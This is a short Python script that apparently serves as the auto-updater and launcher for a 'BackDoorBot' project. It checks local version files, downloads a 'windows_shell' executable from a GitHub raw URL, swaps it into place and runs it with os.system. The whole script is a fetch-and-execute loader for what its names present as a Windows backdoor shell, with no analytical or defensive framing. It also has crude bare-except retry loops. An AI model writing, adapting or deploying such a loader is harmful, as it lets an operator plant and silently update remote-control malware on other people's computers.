import os, wget
p=os.getcwd()
ipo=0
def main():
    while 1:

        try:
            file = open(p+"/vers/version.txt", "r")
            versia=file.read().split("\n")[-1]
            break
        except:
            wget.download("https://raw.githubusercontent.com/DmodvGH/BackDoorBot/main/version.txt", p+"/vers/version.txt")

    while 1:
        try:
            listvers = open(p+"/vers/vers.txt", "r")
            versiam=listvers.read().split("\n")[0]
            break
        except:
            listvers = open(p+"/vers/vers.txt", "w")
            listvers.write("0.1.0")

    if versia[:5]==versiam:
        return 1, "0.1.0"
    else:
        return 0, versia[:5]

while 1:
    try:
        klop, kakai_versia=main()
        if klop:
            os.system(f"start {p}/vers/windows_shell.exe")
        else:
            wget.download(f"https://raw.githubusercontent.com/DmodvGH/BackDoorBot/main/bot_main/windows_shell{ipo}.exe", p+"/vers/windows_shell.exe")
            os.remove(p+"/main/windows_shell.exe")
            os.replace("vers/windows_shell.exe", "main/windows_shell.exe")
            vers= open(p+"/vers/vers.txt", "w")
            vers.write(kakai_versia)
            vers.close()
    except:
        print(0)